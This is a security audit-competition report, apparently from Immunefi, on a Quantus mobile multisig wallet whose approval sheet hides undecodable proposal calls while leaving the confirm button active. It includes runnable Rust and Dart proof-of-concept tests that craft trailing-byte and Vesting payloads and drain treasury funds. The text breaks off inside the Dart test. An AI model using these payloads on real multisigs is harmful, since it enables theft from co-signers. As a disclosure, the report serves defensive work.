# 90351 w a high the multisig approval screen signs call bytes it could not decode showing the signer a call name and no parameters

**Submitted on Aug 24th 2026 at 15:53:56 UTC by @gzeon for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #90351
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief/Intro

`MultisigActionConfirmSheet` fetches the authoritative proposal bytes from `Multisig.Proposals` before an approval, which is the right thing to do. If those bytes then fail to decode it catches the exception, renders a headline built from the indexer's pallet and call names with no parameters at all, and leaves the confirm button live, because the flag that gates the button is set only when the *loader* throws. The signer approves bytes their wallet declined to read.

Two things reach that state. The runtime declares eighteen pallets and the bundled codec has thirteen cases, one of which is for a pallet the runtime has removed, so six of the runtime's pallets are undecodable, including `Vesting` at 22. More sharply, the chain's `RuntimeCall::decode` reads a call's prefix and ignores what follows, while the wallet's decoder rejects a single trailing byte outright, so appending one junk byte to any call at all produces bytes the chain stores, approves and executes and the wallet cannot render. The second trigger needs no gap in the bindings and works on any multisig, including a user's own.

A malicious co-signer proposes such a call. The victim's wallet shows them two words under the sentence "You are about to approve a transfer of", with no destination and no amount, and their approval carries it to threshold.

## Vulnerability Details

### The screen's stated contract

```dart
// mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart:38
// Approving resubmits the proposal's inner call, which the chain compares
// byte-for-byte against what it stored - so the bytes come from the chain,
// and the sheet shows the caller exactly which call they are approving.
loadCallBytes: (ref) =>
    ref.read(multisigServiceProvider).fetchProposalCallBytes(msig: msig, proposalId: proposal.id),
```

The bytes do come from the chain: `fetchProposalCallBytes` queries `Multisig.Proposals` and returns `stored.call` (`quantus_sdk/lib/src/services/multisig_service.dart:409`, `:412`). Showing the caller exactly which call they are approving is the half that stops.

### A decode failure never closes the gate

```dart
// mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:185
DecodedCall? get _decodedProposalCall {
  final bytes = _callBytes;
  if (bytes != null) {
    try {
      return CallDecoder.decodeBytes(bytes);
    } catch (e) {
      quantusPrint('${widget.logPrefix} could not decode stored proposal call: $e');
    }
  }
  return widget.proposal.decodedCall;
}
```

`widget.proposal.decodedCall` runs `CallDecoder.decodeBytes` over the indexer's copy of the same call (`quantus_sdk/lib/src/models/multisig_proposal.dart:146`, `:270`) and swallows its own failure the same way (`:272`), so the getter returns null.

The only assignment that would disable the button lives in the loader's catch block:

```dart
// multisig_action_confirm_sheet.dart:169
} catch (e, st) {
  quantusPrint('${widget.logPrefix} proposal call load error: $e $st');
  if (!mounted) return;
  setState(() {
    _loadingCallBytes = false;
    _callBytesFailed = true;      // :174, the sole `true` assignment
    _loadingFee = false;
  });
  return;
}
```

```dart
// multisig_action_confirm_sheet.dart:362
// Never confirm an action whose call bytes were meant to load but did not.
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;
```

```dart
// multisig_action_confirm_sheet.dart:403, the confirm button
QuantusButton.simple(
  label: widget.labels.confirmLabel(l10n),
  variant: widget.confirmVariant,
  isDisabled: blocked,
  onTap: blocked ? null : _confirm,
),
```

The load succeeded, so `_callBytesFailed` stays false and `blocked` stays false. The stated intent, "never confirm an action whose call bytes were meant to load but did not", covers a load failure and not a decode failure.

This sheet is shared. `multisig_approve_confirm_sheet.dart:23`, `multisig_cancel_confirm_sheet.dart:19` and `multisig_execute_confirm_sheet.dart:18` all construct `MultisigActionConfirmSheet` with a `loadCallBytes`, so approve, cancel and execute inherit the same getter, the same flag and the same gate. The signer who executes the proposal, the step that dispatches the call, is shown no more than the signer who approved it.

### What the signer sees instead

With `_decodedProposalCall` null, `build` falls through to `_fallbackTransferCall`:

```dart
// multisig_action_confirm_sheet.dart:353
final decoded = _decodedProposalCall;
final headline = DecodedCallHeadline.of(decoded ?? _fallbackTransferCall, ...);   // :354
```

```dart
// multisig_action_confirm_sheet.dart:199
DecodedCall get _fallbackTransferCall {
  final proposal = widget.proposal;
  final hasTransfer = proposal.amount != BigInt.zero || proposal.recipient.isNotEmpty;
  return DecodedCall(
    pallet: proposal.pallet,
    call: proposal.call,
    fields: const [],
    summary: hasTransfer ? TransferSummary(...) : null,
  );
}
```

`pallet` and `call` are indexer strings (`multisig_proposal.dart:125`, `:126`), `fields` is empty by construction, and the parameter view is skipped when fields are empty (`multisig_action_confirm_sheet.dart:386`). No warning is rendered, because the only error text is gated on `_callBytesFailed` (`:382`). The app is not short of a signal either: it asks the indexer for `decode_error` on every proposal row (`quantus_sdk/lib/src/services/multisig_graphql.dart:209`) and parses it into `MultisigProposal.decodeError` (`quantus_sdk/lib/src/models/multisig_proposal.dart:138`), and no screen reads that field.

The sheet's own copy completes the deception. `multisigApproveConfirmBody` is "You are about to approve a transfer of" (`mobile-app/lib/l10n/app_en.arb:958`), a sentence written to be finished by the headline underneath it. The PoC captures every string the sheet renders over a 500 000 QUAN transfer the signer is about to approve:

```
[Are you sure?, You are about to approve a transfer of, Transfer allow death, Balances, NETWORK FEE, 0.001 QUAN, Yes, Approve, No, Go Back]
```

No destination, no amount, and a live confirm button. The only number on the screen is the fee.

### Trigger A: a pallet the bindings do not carry

`RuntimeCall._decode` has cases for pallet indices 0, 1, 2, 7, 9, 11, 13, 14, 15, 16, 17, 19 and 20 (`quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart:107` to `:132`). The runtime declares eighteen pallets at indices 0, 1, 2, 3, 5, 6, 7, 8, 9, 11, 13, 14, 15, 16, 19, 20, 21 and 22, so `Scheduler`, `ZkTree` and `Vesting` are among the six with no case (`runtime/src/lib.rs:283`, `:286`). One of the codec's thirteen cases, `Assets` at 17, is for a pallet the runtime has removed. It states its own origin, `specVersion: 136` (`quantus_sdk/lib/generated/planck/pallets/system.dart:767`), against the runtime's `spec_version: 143` (`runtime/src/lib.rs:79`).

`Vesting` is the sharpest instance. Its admin calls are gated on `EitherOfDiverse<EnsureRoot<AccountId>, EnsureTreasury>` (`runtime/src/configs/mod.rs:630`), and `EnsureTreasury` accepts a signed origin equal to the treasury account (`:608`, `:612`). The treasury is a 2-of-3 multisig (`runtime/src/genesis_config_presets.rs:454`), and `pallet-multisig` dispatches an executed proposal as `RawOrigin::Signed(multisig_address)` (`pallets/multisig/src/lib.rs:1156`). The pallet the wallet cannot read is the pallet the treasury multisig exists to drive.

### Trigger B: one trailing byte, with the bindings fully current

The chain and the wallet disagree about trailing bytes. `Multisig::propose` decodes with SCALE's `decode`, which reads the call's prefix and leaves the rest in the buffer:

```rust
// pallets/multisig/src/lib.rs:599
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

The wallet's decoder treats the same bytes as a hard error:

```dart
// quantus_sdk/lib/src/chain/call_decoder.dart:50
/// Trailing bytes mean the sender and this decoder disagree about the call's
/// shape, so the result cannot be trusted for display - throw instead.
static DecodedCall decodeBytes(List<int> bytes) {
  final input = Input.fromBytes(Uint8List.fromList(bytes));
  final call = runtime.RuntimeCall.codec.decode(input);
  final remaining = input.remainingLength ?? 0;
  if (remaining != 0) {
    throw FormatException('$remaining trailing bytes after nested call');   // :57
  }
  return describe(call);
}
```

`Multisig::execute` decodes the stored bytes the same prefix-tolerant way (`pallets/multisig/src/lib.rs:1125`), and neither call site uses `decode_all`, so nothing in the pallet ever objects to the tail.

So a proposer appends one junk byte to an ordinary `Balances::transfer_allow_death`. The chain accepts the proposal, stores the 45 bytes verbatim, and executes the 44-byte call inside them. `Multisig::approve` requires `call == proposal.call` (`pallets/multisig/src/lib.rs:780`), so the victim's wallet fetches those exact 45 bytes and resubmits them, which is what makes the byte-equality check work against the victim rather than for them. The decoder throws on the trailing byte, the sheet swallows it, and a transfer the bindings decode perfectly well is rendered as "Transfer allow death / Balances" with no destination and no amount. PoC 2 case B shows the same bytes minus the last byte decoding into a full summary.

The indexer cannot rescue the victim either. Its `multisig_proposal` row carries `transfer_amount` and `transferTo` (`quantus_sdk/lib/src/services/multisig_graphql.dart:202`, `:213`), so an indexer that reads a direct transfer server-side could still populate the headline. Wrapping the same transfer in `Utility::batch` removes that: a batch is not a direct transfer, the columns stay empty, and the sheet renders "Batch / Utility". PoC 2 case B2 does exactly that over a 250 000 QUAN transfer, and shows the same bytes minus the trailing byte decoding into a two-field `Utility.batch`.

This trigger does not depend on the codec's pallet coverage, on the runtime's `spec_version`, or on the treasury. It applies to every call and every multisig, so a personal 2-of-3 with no privileged role is exposed to it.

### The same SDK refuses this on the hardware path

One decoder serves both surfaces. The approval sheet calls `CallDecoder.decodeBytes` (`multisig_action_confirm_sheet.dart:189`), the signing path calls `CallDecoder.describe` (`quantus_sdk/lib/src/quantus_payload_parser.dart:159`), and both reach the same `_multisig` branch, which recurses into the call being approved:

```dart
// quantus_sdk/lib/src/chain/call_decoder.dart:339
case multisig.Approve(:final multisigAddress, :final proposalId, :final call):
  // The chain only counts this approval if these bytes are byte-equal to
  // the stored proposal, so the inner call shown here is the call being
  // approved - not unverifiable context.
  final inner = decodeBytes(call);
```

That `decodeBytes` is unguarded, so a Keystone signer scanning the same approval gets a `FormatException` out of `QuantusPayloadParser.parsePayload` (`quantus_sdk/lib/src/quantus_payload_parser.dart:119`) and the cold wallet refuses to sign (`cold-wallet-app/lib/screens/sign_transaction_screen.dart:48`). The project's own tests pin both halves: `approve` must expose the inner call being approved (`quantus_sdk/test/chain/call_decoder_test.dart:121`), and an unparseable payload is "never signed" (`cold-wallet-app/test/transaction_signing_test.dart:117`).

The mobile approval sheet is the one signing surface that catches that exception and continues.

### Not fixed, and not fixed upstream either

`2293f20`, "fix: multisig approve must carry the proposal's inner call" (#585, 2026-07-27), introduced both halves: the authoritative `loadCallBytes` fetch and the `_callBytesFailed` flag that gates only on a load failure. The in-scope asset is frozen at `d5fc4d6` and `refs/heads/audit-comp-ready` still resolves to it.

The public upstream repository is worth stating explicitly, because it has moved and does not fix this. `Quantus-Network/quantus-apps` PR #610, "fix: take the wormhole volume fee from the shipped runtime metadata", merged 2026-08-21 as `8fd9021`, regenerated the bindings as a side effect and added `case 22` for `Vesting`. It does not touch `multisig_action_confirm_sheet.dart`: at that commit the file's `_decodedProposalCall`, `_fallbackTransferCall` and `blocked` are byte-identical to the in-scope copy, differing only in imports, a text style and a spacer. The regenerated bindings still decode thirteen of the runtime's eighteen pallet indices, leaving 3, 5, 6, 8 and 21 undecodable, and trigger B never depended on the bindings at all.

### Preconditions

* The attacker is one signer of a multisig the victim also signs, and crafts the proposal outside the app. For trigger B that is any multisig; for trigger A the treasury multisig is what makes `Vesting` reachable.
* For trigger A only: the treasury multisig has been created post-genesis and funded. No preset seeds `Multisigs` storage, and the shipped Planck preset says why: the treasury is `derive_multisig_address(&planck_treasury_signers(), 2, 0)` (`runtime/src/genesis_config_presets.rs:454`), each signer is seeded "enough to create + propose on the treasury multisig once" (`:560`), and the vesting pot gets its ED buffer "so `create_schedule` works post-genesis" (`:571`).
* The deceived co-signer approves from the mobile app with a local software signer, the path PoC 2 exercises. A Keystone signer takes a different branch (`multisig_action_confirm_sheet.dart:259`) and the cold wallet refuses the payload.
* No hostile indexer is required. An honest one supplies the true pallet and call names and nothing else; one that could not read the call either leaves the headline blank, which PoC 2 case A2 shows.

## Impact Details

**(Websites & Applications) Malicious interactions with an already-connected wallet, such as: modifying transaction arguments or parameters; submitting malicious transactions.**

The co-signer's connected wallet builds and submits a real `Multisig::approve` over bytes it never displayed, under a line of copy telling them they are approving a transfer. For `Balances::transfer_allow_death(dest, value)` neither the destination nor the value is on screen; for `Vesting::create_schedule(beneficiary, start, cliff, end, total)` neither the beneficiary nor the amount is. The one number the signer sees is the 0.001 QUAN network fee.

A single signer on a 2-of-3 has authority to propose, not to spend. The screen is what carries their proposal past a second signer who never agreed to it.

Trigger B bounds the loss at the balance of whatever multisig the attacker co-signs, and reaches ordinary user multisigs. Trigger A bounds it at the treasury balance, since `create_schedule` transfers `total` out of the treasury with `Preservation::Preserve`, subject only to `total >= MinimumPayout`, `total % PayoutQuantum == 0`, and the treasury keeping its existential deposit (`pallets/vesting/src/lib.rs:522`). The treasury takes 50 percent of every block reward (`runtime/src/genesis_config_presets.rs:575`), and the reward is remaining supply over an `EmissionDivisor` of 15 163 560 (`runtime/src/configs/mod.rs:144`) against a 21 000 000 QUAN cap (`runtime/src/lib.rs:105`) on 12-second blocks (`runtime/src/lib.rs:87`), so early in the chain's life the treasury accrues roughly 4 986 QUAN per day. A schedule whose dates are already past is fully vested on arrival, and `claim` is documented permissionless with the payout always going to the stored beneficiary (`pallets/vesting/src/lib.rs:326`), so any funded account finishes the theft; PoC 1 uses an unrelated one.

PoC 1 moves 1 000 000 QUAN out of a 2 000 000 QUAN treasury through trigger A, 500 000 QUAN through trigger B, and 250 000 QUAN through the batch form of trigger B.

## References

* `mobile-app/lib/v2/screens/multisig/multisig_approve_confirm_sheet.dart:38`, `:41` the loader and its stated contract
* `multisig_approve_confirm_sheet.dart:23`, `multisig_cancel_confirm_sheet.dart:19`, `multisig_execute_confirm_sheet.dart:18` the three sheets sharing the widget
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:185`, `:189` the decode and the swallowed exception
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:174` the sole `_callBytesFailed = true`
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:199` `_fallbackTransferCall`
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:353`, `:354`, `:362`, `:406`, `:407` the headline, the gate, the button
* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart:382`, `:386` the warning and the parameter view, both skipped
* `mobile-app/lib/l10n/app_en.arb:958` the sheet's body copy, "You are about to approve a transfer of"
* `quantus_sdk/lib/src/services/multisig_service.dart:409`, `:412` the authoritative fetch
* `quantus_sdk/lib/src/services/multisig_graphql.dart:202`, `:209`, `:213` the indexer's transfer columns and the `decode_error` field the app never reads
* `quantus_sdk/lib/src/models/multisig_proposal.dart:138` where `decode_error` is parsed and then unused
* `quantus_sdk/lib/src/models/multisig_proposal.dart:125`, `:126`, `:146`, `:270`, `:272` indexer pallet and call, and the getter that fails the same way
* `quantus_sdk/lib/src/chain/call_decoder.dart:50`, `:57`, `:339` the decoder's display policy, the trailing-byte rejection, and the unguarded recursion into an approve's inner call
* `quantus_sdk/lib/src/quantus_payload_parser.dart:119`, `:130`, `:137`, `:142`, `:159` the fail-closed signing decoder in the same codebase
* `quantus_sdk/test/chain/call_decoder_test.dart:121`, `cold-wallet-app/test/transaction_signing_test.dart:117` the project's own tests for the correct behaviour
* `quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart:107` to `:132` the decoded pallet indices
* `quantus_sdk/lib/generated/planck/pallets/system.dart:767` and `runtime/src/lib.rs:79` codec spec 136 against runtime spec 143
* `runtime/src/lib.rs:283`, `:286` `ZkTree` at 21 and `Vesting` at 22
* `runtime/src/configs/mod.rs:144`, `:608`, `:612`, `:630`, `:648` the emission divisor, `EnsureTreasury`, the vesting `AdminOrigin`, and `MaxCallSize`
* `runtime/src/genesis_config_presets.rs:454`, `:560`, `:571`, `:575` the Planck treasury multisig, the signer funding, the pot buffer, and the treasury portion
* `pallets/multisig/src/lib.rs:557`, `:599`, `:615`, `:780`, `:1125`, `:1156` signer check, the prefix-tolerant decode on propose and again on execute, high-security classification, byte-equality on approve, dispatch origin
* `pallets/vesting/src/lib.rs:326`, `:331`, `:376`, `:500`, `:522` the permissionless claim and its stored beneficiary, treasury funding, the past-end branch, and the absent future-date check

## Proof of Concept

Two runnable tests. PoC 1 executes every payload on the chain and prints the balances that move. PoC 2 pumps the shipped approval sheet over the same bytes. The hex strings are identical across the two, so what the wallet declines to display is what the chain executes.

### PoC 1: the chain executes both payloads

{% stepper %}
{% step %}

## Clone the repository

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain
cd audit-comp-quantus-chain && git checkout 3b243b870a5442a6e5f443056f67bbba87d472f5
export LIBCLANG_PATH=/usr/lib/llvm-14/lib   # only where bindgen cannot find libclang
```

{% endstep %}

{% step %}

## Add the tests

Append this to the existing `mod tests` block in `runtime/tests/governance/vesting.rs`, and widen that file's `use codec::Encode;` to `use codec::{Decode, Encode};`. It reuses the file's own helpers, which already model the shipped treasury: `treasury_multisig()` is `derive_multisig_address(&[account(1), account(2), account(3)], 2, 0)`, and `propose_approve_execute` runs `Multisig::propose` by signer 1, `Multisig::approve` by signer 2, `Multisig::execute` by signer 3. Signer 2's approval is the step the mobile sheet renders.

```rust
	fn attacker() -> AccountId32 {
		AccountId32::new([0xA7u8; 32])
	}

	/// Someone with no relationship to the multisig or the schedule, used to show
	/// that finishing the theft needs no further signature from a signer.
	fn bystander() -> AccountId32 {
		AccountId32::new([0xB9u8; 32])
	}

	#[test]
	fn poc_blind_approved_vesting_schedule_drains_the_treasury() {
		new_test_ext(Some(treasury_multisig())).execute_with(|| {
			let treasury = treasury_multisig();
			let pot = Vesting::pot_account_id();

			// Wall clock is well past the dates the attacker will use, so the grant is
			// fully vested the moment it exists.
			const NOW_MS: u64 = 10_000_000;
			const START_MS: u64 = 1_000;
			const CLIFF_MS: u64 = 2_000;
			const END_MS_PAST: u64 = 3_000;
			const STOLEN: Balance = 1_000_000 * UNIT;
			set_time(NOW_MS);

			// The signers stand up their 2-of-3 treasury multisig, as every shipped
			// preset expects them to, and the treasury has accrued its share of rewards.
			assert_ok!(Multisig::create_multisig(
				RuntimeOrigin::signed(account(1)),
				signers(),
				2,
				0,
			));
			Balances::make_free_balance_be(&treasury, 2_000_000 * UNIT);
			Balances::make_free_balance_be(&attacker(), 0);
			Balances::make_free_balance_be(&bystander(), UNIT);

			let treasury_before = Balances::total_balance(&treasury);
			let attacker_before = Balances::total_balance(&attacker());
			println!("before   treasury = {} QUAN", treasury_before / UNIT);
			println!("before   attacker = {} QUAN", attacker_before / UNIT);

			// The malicious signer's proposal. Every date is in the past and the
			// beneficiary is the attacker.
			let call = RuntimeCall::Vesting(pallet_vesting::Call::create_schedule {
				beneficiary: attacker(),
				start: START_MS,
				cliff: CLIFF_MS,
				end: END_MS_PAST,
				total: STOLEN,
			});
			let encoded = call.encode();

			// These are byte-for-byte the bytes the Dart PoC feeds to
			// `CallDecoder.decodeBytes`, which throws on them. Pallet index 22
			// (Vesting), call index 1 (create_schedule).
			assert_eq!(&encoded[0..2], &[22u8, 1u8]);
			let as_hex: String = encoded.iter().map(|b| format!("{b:02x}")).collect();
			println!("proposal call bytes = 0x{as_hex}");

			// Signer 1 proposes, signer 2 approves, signer 3 executes. The approval in
			// the middle is the step the mobile wallet renders as a bare
			// "Vesting / create_schedule" with no beneficiary and no amount.
			propose_approve_execute(call, 0);

			let schedule =
				pallet_vesting::Schedules::<Runtime>::get(0).expect("schedule was created");
			assert_eq!(schedule.beneficiary, attacker());
			assert_eq!(schedule.total, STOLEN);
			assert_eq!(Balances::total_balance(&treasury), treasury_before - STOLEN);
			assert_eq!(Balances::total_balance(&pot), STOLEN + EXISTENTIAL_DEPOSIT);

			// The grant is already fully vested, because `schedule_is_valid` never
			// required the dates to be in the future.
			assert_eq!(Vesting::vested_amount(&schedule, NOW_MS), STOLEN);

			// `claim` is permissionless and always pays the stored beneficiary, so an
			// account with no connection to the multisig finishes the theft.
			assert_ok!(Vesting::claim(RuntimeOrigin::signed(bystander()), 0));

			let treasury_after = Balances::total_balance(&treasury);
			let attacker_after = Balances::total_balance(&attacker());
			println!("after    treasury = {} QUAN", treasury_after / UNIT);
			println!("after    attacker = {} QUAN", attacker_after / UNIT);
			println!("STOLEN            = {} QUAN in one approval", (attacker_after - attacker_before) / UNIT);

			assert_eq!(attacker_after - attacker_before, STOLEN);
			assert_eq!(treasury_before - treasury_after, STOLEN);
			assert_eq!(Balances::total_balance(&pot), EXISTENTIAL_DEPOSIT);
		});
	}

	/// The wallet's decoder rejects trailing bytes outright, but the runtime's
	/// `RuntimeCall::decode` reads its prefix and ignores the rest. So a proposal
	/// can be stored whose bytes the chain executes and the app cannot render,
	/// for ANY call, with fully current bindings.
	#[test]
	fn poc_trailing_byte_proposal_executes_but_cannot_be_rendered() {
		new_test_ext(Some(treasury_multisig())).execute_with(|| {
			let treasury = treasury_multisig();
			const STOLEN: Balance = 500_000 * UNIT;
			set_time(10_000_000);

			assert_ok!(Multisig::create_multisig(
				RuntimeOrigin::signed(account(1)),
				signers(),
				2,
				0,
			));
			Balances::make_free_balance_be(&treasury, 2_000_000 * UNIT);
			Balances::make_free_balance_be(&attacker(), 0);

			let call = RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
				dest: attacker().into(),
				value: STOLEN,
			});
			let mut encoded = call.encode();
			let clean_len = encoded.len();
			encoded.push(0xFF); // one junk byte the chain never reads

			// The chain decodes the prefix and ignores the tail.
			let decoded = RuntimeCall::decode(&mut &encoded[..]).expect("runtime accepts it");
			assert_eq!(decoded, call);

			let as_hex: String = encoded.iter().map(|b| format!("{b:02x}")).collect();
			println!("stored proposal bytes = 0x{as_hex}");
			println!("  call is {clean_len} bytes, stored is {} bytes", encoded.len());

			let attacker_before = Balances::total_balance(&attacker());
			let bounded: BoundedCallOf<Runtime> = encoded.clone().try_into().unwrap();
			let expiry = System::block_number() + 100;
			assert_ok!(Multisig::propose(
				RuntimeOrigin::signed(account(1)),
				treasury.clone(),
				bounded.clone(),
				expiry,
			));
			// Byte-equality holds because the app resubmits exactly what it fetched.
			assert_ok!(Multisig::approve(
				RuntimeOrigin::signed(account(2)),
				treasury.clone(),
				0,
				bounded,
			));
			assert_ok!(Multisig::execute(RuntimeOrigin::signed(account(1)), treasury, 0));

			let gained = Balances::total_balance(&attacker()) - attacker_before;
			println!("attacker gained       = {} QUAN", gained / UNIT);
			assert_eq!(gained, STOLEN);
		});
	}

	/// Same trailing-byte trick over `Utility::batch`, which no indexer summarises
	/// as a direct transfer, so the sheet's indexer fallback has nothing to show
	/// even when the bindings are current and the indexer is honest.
	#[test]
	fn poc_trailing_byte_batch_executes_but_cannot_be_rendered() {
		new_test_ext(Some(treasury_multisig())).execute_with(|| {
			let treasury = treasury_multisig();
			const STOLEN: Balance = 250_000 * UNIT;
			set_time(10_000_000);

			assert_ok!(Multisig::create_multisig(
				RuntimeOrigin::signed(account(1)),
				signers(),
				2,
				0,
			));
			Balances::make_free_balance_be(&treasury, 2_000_000 * UNIT);
			Balances::make_free_balance_be(&attacker(), 0);

			let inner = RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
				dest: attacker().into(),
				value: STOLEN,
			});
			let call = RuntimeCall::Utility(pallet_utility::Call::batch { calls: vec![inner] });
			let mut encoded = call.encode();
			let clean_len = encoded.len();
			encoded.push(0xFF);
			assert_eq!(RuntimeCall::decode(&mut &encoded[..]).expect("runtime accepts it"), call);

			let as_hex: String = encoded.iter().map(|b| format!("{b:02x}")).collect();
			println!("stored proposal bytes = 0x{as_hex}");
			println!("  call is {clean_len} bytes, stored is {} bytes", encoded.len());

			let attacker_before = Balances::total_balance(&attacker());
			let bounded: BoundedCallOf<Runtime> = encoded.try_into().unwrap();
			let expiry = System::block_number() + 100;
			assert_ok!(Multisig::propose(
				RuntimeOrigin::signed(account(1)),
				treasury.clone(),
				bounded.clone(),
				expiry,
			));
			assert_ok!(Multisig::approve(
				RuntimeOrigin::signed(account(2)),
				treasury.clone(),
				0,
				bounded,
			));
			assert_ok!(Multisig::execute(RuntimeOrigin::signed(account(1)), treasury, 0));

			let gained = Balances::total_balance(&attacker()) - attacker_before;
			println!("attacker gained       = {} QUAN", gained / UNIT);
			assert_eq!(gained, STOLEN);
		});
	}
```

{% endstep %}

{% step %}

## Run the tests

```bash
cargo test --release -p quantus-runtime --test mod poc_ -- --nocapture --test-threads=1
```

Output:

```
running 3 tests
test governance::vesting::tests::poc_blind_approved_vesting_schedule_drains_the_treasury ... before   treasury = 2000000 QUAN
before   attacker = 0 QUAN
proposal call bytes = 0x1601a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7e803000000000000d007000000000000b80b000000000000000064a7b3b6e00d0000000000000000
after    treasury = 1000000 QUAN
after    attacker = 1000000 QUAN
STOLEN            = 1000000 QUAN in one approval
ok
test governance::vesting::tests::poc_trailing_byte_batch_executes_but_cannot_be_rendered ... stored proposal bytes = 0x090004020000a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7130000d9e9ac2d7803ff
  call is 47 bytes, stored is 48 bytes
attacker gained       = 250000 QUAN
ok
test governance::vesting::tests::poc_trailing_byte_proposal_executes_but_cannot_be_rendered ... stored proposal bytes = 0x020000a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7130000b2d3595bf006ff
  call is 44 bytes, stored is 45 bytes
attacker gained       = 500000 QUAN
ok

test result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 42 filtered out; finished in 0.00s
```

{% endstep %}
{% endstepper %}

### PoC 2: the wallet renders those bytes with a live confirm button and no parameters

{% stepper %}
{% step %}

## Clone and prepare the application

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-apps
cd audit-comp-quantus-apps && git checkout d5fc4d6572ebc2244e95009a33f5da5048935867
cd mobile-app
touch .env          # pubspec lists .env as an asset; an empty file is enough for tests
flutter pub get     # Flutter 3.47.1 / Dart 3.13.1; the app requires Dart >= 3.10
```

{% endstep %}

{% step %}

## Write the test

Write `mobile-app/test/unit/multisig_blind_approval_poc_test.dart`. It pumps the shipped `MultisigActionConfirmSheet` with the labels `showMultisigApproveConfirmSheet` passes it (`multisig_approve_confirm_sheet.dart:23`) and stubs for the fee, build and submit callbacks; `makeAccount` and `makeMultisigAccount` come from the project's own `test/fakes.dart`. Signer 1 proposed, so the sheet acts for signer 2, the co-signer whose approval reaches threshold.

```dart
import 'dart:typed_data';

import 'package:convert/convert.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:quantus_sdk/generated/planck/pallets/balances.dart' as balances_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/sp_runtime/multiaddress/multi_address.dart' as multi_address;
import 'package:resonance_network_wallet/v2/components/quantus_button.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';
import 'package:resonance_network_wallet/v2/theme/app_theme.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../fakes.dart';

final attackerId = Uint8List.fromList(List.filled(32, 0xA7));
final oneMillionQuan = BigInt.from(1000000) * BigInt.from(1000000000000);
final halfMillionQuan = BigInt.from(500000) * BigInt.from(1000000000000);

/// Trigger A, stale bindings. The runtime puts `Vesting` at pallet index 22 and
/// `create_schedule` at call index 1; the bundled codec's `RuntimeCall._decode`
/// has no case for 22.
///
/// Byte-for-byte the call the runtime test
/// `poc_blind_approved_vesting_schedule_drains_the_treasury` executes to move
/// 1 000 000 QUAN out of the treasury.
Uint8List vestingCreateSchedule() {
  final out = BytesBuilder();
  out.addByte(22); // Vesting
  out.addByte(1); // create_schedule
  out.add(attackerId); // beneficiary
  for (final ms in [1000, 2000, 3000]) {
    // start, cliff, end: all in the past, so the grant is fully vested at once
    final b = ByteData(8)..setUint64(0, ms, Endian.little);
    out.add(b.buffer.asUint8List());
  }
  final total = Uint8List(16); // u128 LE
  var v = oneMillionQuan;
  for (var i = 0; i < 16; i++) {
    total[i] = (v & BigInt.from(0xFF)).toInt();
    v = v >> 8;
  }
  out.add(total);
  return out.toBytes();
}

/// Trigger B, current bindings. `RuntimeCall::decode` reads its prefix and
/// ignores what follows, so the chain stores, approves and executes these bytes;
/// `CallDecoder.decodeBytes` rejects them for the trailing byte alone. This
/// needs no gap in the codec, so it applies to any call and any multisig.
///
/// Byte-for-byte the payload the runtime test
/// `poc_trailing_byte_proposal_executes_but_cannot_be_rendered` executes to move
/// 500 000 QUAN.
Uint8List transferWithTrailingByte() {
  final clean = const balances_pallet.Txs()
      .transferAllowDeath(dest: multi_address.MultiAddress.values.id(attackerId), value: halfMillionQuan)
      .encode();
  return Uint8List.fromList([...clean, 0xFF]);
}

/// Trigger B over `Utility::batch`, which an indexer does not summarise as a
/// direct transfer, so its `transfer_amount` and `transferTo` columns stay empty
/// and the sheet's fallback has nothing to show. The bindings decode `Utility`
/// (case 9) and the nested `Balances` call perfectly well.
///
/// Byte-for-byte the payload the runtime test
/// `poc_trailing_byte_batch_executes_but_cannot_be_rendered` executes to move
/// 250 000 QUAN.
Uint8List batchTransferWithTrailingByte() {
  final inner = const balances_pallet.Txs().transferAllowDeath(
    dest: multi_address.MultiAddress.values.id(attackerId),
    value: BigInt.from(250000) * BigInt.from(1000000000000),
  );
  final clean = const utility_pallet.Txs().batch(calls: [inner]).encode();
  return Uint8List.fromList([...clean, 0xFF]);
}

/// The indexer's proposal row. `MultisigProposal.fromIndexerJson` runs
/// `_stringOrEmpty` over pallet and call and leaves the transfer columns at zero
/// when it has none, so this covers an indexer that names the call and one that
/// could not read it either.
MultisigProposal indexedProposal({required String pallet, required String call}) => MultisigProposal(
  entityId: 'e0',
  id: 0,
  multisigAddress: makeMultisigAccount().accountId,
  proposer: makeAccount(1).accountId,
  createdAt: DateTime.now(),
